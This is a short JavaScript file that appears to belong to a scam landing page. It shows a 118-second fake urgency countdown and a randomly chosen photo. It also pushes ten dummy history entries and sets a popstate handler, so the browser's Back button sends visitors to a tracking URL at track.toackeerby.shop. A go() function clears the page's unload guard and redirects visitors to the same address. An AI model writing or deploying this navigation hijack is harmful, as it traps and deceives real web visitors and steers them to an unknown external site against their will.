function startTimer(t, n) {
    var o, e, a = t;
    setInterval(function() {
        o = parseInt(a / 60, 10);
        e = parseInt(a % 60, 10);
        o = o < 10 ? "0" + o : o;
        e = e < 10 ? "0" + e : e;
        n.textContent = o + ":" + e;
        --a < 0 && (a = 0);
    }, 1000);
}

function go() {
    window.onbeforeunload = null;
    window.location = "https://track.toackeerby.shop/cwdhl0k.php?lp=1";
}

window.onload = function() {
    var photos = Array.from(document.getElementsByClassName("photo"));
    var randomIndex = Math.floor(Math.random() * photos.length);
    photos[randomIndex].style.display = "block";
    
    startTimer(118, document.querySelector("#timer"));
};

(function() {
    var t;
    try {
        const n = window.location.href.split(/[#]/)[0];
        for (t = 0; t < 10; ++t) {
            history.pushState({}, "", n + "#");
        }
        onpopstate = function(t) {
            if (t.state) {
                location.replace("https://track.toackeerby.shop/cwdhl0k.php?lp=1");
            }
        };
    } catch (t) {
        console.log(t);
    }
})();